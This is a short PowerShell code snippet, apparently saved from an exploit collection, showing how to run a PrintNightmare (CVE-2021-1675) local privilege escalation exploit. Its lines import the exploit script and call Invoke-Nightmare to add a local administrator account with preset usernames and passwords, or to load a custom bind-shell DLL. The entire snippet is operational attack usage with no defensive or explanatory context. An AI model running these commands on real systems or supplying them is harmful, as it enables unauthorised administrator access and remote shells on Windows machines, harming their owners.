---
id: e9797ab4-817b-49da-83d7-a8b2be294ede
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:02.971387+00:00'
updated_at: '2023-04-10T20:26:14.550915+00:00'
---

# Code Snippet e9797ab4

**Language**: Powershell

```powershell
## LPE only (PS1 + DLL)
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```


